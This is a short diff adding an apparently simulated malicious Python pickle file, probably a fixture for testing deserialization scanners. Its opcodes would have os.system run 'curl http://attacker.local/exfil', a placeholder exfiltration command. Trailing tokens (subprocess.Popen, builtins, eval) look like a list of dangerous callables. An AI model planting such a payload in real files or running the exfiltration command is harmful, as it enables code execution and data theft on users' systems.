@@ -1,0 +1,8 @@
+SIMULATED_PICKLE_HEADER_v4
+cos
+system
+(S'curl http://attacker.local/exfil'
+tR.
+subprocess.Popen
+builtins
+eval
